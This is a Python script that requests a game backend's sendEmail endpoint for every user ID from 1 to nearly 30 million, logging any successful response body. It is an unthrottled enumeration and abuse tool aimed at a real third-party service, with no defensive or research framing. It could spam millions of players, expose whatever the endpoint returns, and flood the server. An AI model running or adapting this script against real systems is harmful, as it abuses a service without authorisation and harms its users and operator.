import requests
import json

url = 'https://playonpc-warpath-be.lilith.com/sendEmail?uid='

start_id = 1
end_id = 29999999

while start_id <= end_id:
    request_url = url + str(start_id)
    response = requests.get(request_url)

    if response.status_code == 200:
        try:
            response_data = json.loads(response.text)
            if response_data.get('success') == True:
                print(f'Successfully: {start_id}')
                print(response.text)
            else:
                print(f'Failed: {start_id}')
        except json.JSONDecodeError:
            print(f'Failed to parse JSON response for uid {start_id}')
    else:
        print(f'Failed to send request for uid {start_id}')

    start_id += 1
